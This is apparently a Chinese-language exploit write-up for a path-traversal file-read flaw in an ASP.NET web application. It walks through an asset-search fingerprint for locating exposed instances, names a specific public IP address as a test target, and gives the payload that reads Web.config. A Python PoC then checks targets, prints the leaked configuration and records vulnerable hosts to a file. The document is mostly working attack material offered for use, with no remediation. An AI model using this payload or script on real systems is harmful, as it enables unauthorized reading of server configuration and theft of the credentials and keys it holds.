## 一、资产搜索

```
body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
```

## 二、网站测试

```
http://139.196.43.192:777
```

## 三、验证漏洞

```
/Business/DownLoad.aspx?p=UploadFile/../Web.Config
```

![image-20240914174711802](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914174711802.png)

## 四、POC

```
def poc(target):
    payload = "/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code == 200:
        res2 = requests.get(url=target+payload,verify=False,timeout=5)
        if "configuration" in res2.text:
            with open("result.txt","a",encoding='utf-8') as f:
                f.write(f"[+]{target}\n")
                f.close()
                print(f"[+]{target}存在文件读取漏洞")
            print(f"[+]{target}存在文件读取漏洞")
            print(res2.text)
        else:
            print(f"[-]{target}不存在文件读取漏洞")
    else:
        print("访问超时，请手动测试！！！")
```

## 五、测试结果

![image-20240914175307689](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914175307689.png)

![image-20240914175139460](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914175139460.png)

